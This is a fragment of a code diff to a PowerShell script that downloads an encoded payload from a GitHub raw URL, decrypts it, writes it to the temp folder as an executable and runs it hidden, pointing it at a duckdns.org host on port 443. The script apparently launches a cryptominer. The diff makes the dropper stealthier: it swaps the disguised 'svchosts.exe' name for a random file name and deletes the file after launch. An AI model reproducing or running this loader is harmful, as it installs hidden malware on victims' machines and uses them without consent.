@@ -17,7 +17,7 @@ $var = (New-Object System.Net.WebClient).DownloadString("https://raw.githubuserc
 $yellow = [Convert]::FromBase64String($var)
 $orange = "114"
 $buf = white -Key $orange -Data $yellow
-$temp = [IO.Path]::Combine($env:TEMP, "svchosts.exe")
+$temp = [IO.Path]::Combine($env:TEMP, [Guid]::NewGuid().ToString() + ".exe")
 [IO.File]::WriteAllBytes($temp, $buf)
 Start-Process -FilePath $temp -ArgumentList "-o ontcfu.duckdns.org:443 --tls" -WindowStyle Hidden
-Write-Host "OK"
+Remove-Item $temp -Force
